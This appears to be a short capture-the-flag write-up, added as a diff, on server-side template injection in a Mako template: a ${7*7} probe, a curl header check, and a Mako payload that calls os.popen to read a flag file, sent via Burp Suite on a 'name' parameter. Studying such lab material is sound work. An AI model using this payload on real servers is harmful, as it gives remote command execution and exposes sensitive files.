@@ -1,0 +1,16 @@
+${7*7}
+
+curl -I {url}
+
+in burp 
+
+<%
+import os
+x=os.popen('cat flag').read()
+%>
+${x}
+
+Upon searching on the Internet, we learn that if the "MAKO" payload is used will lead to reading sensitive information on the server.
+
+
+Open the Burp Suite and use the next payload on the name parameter
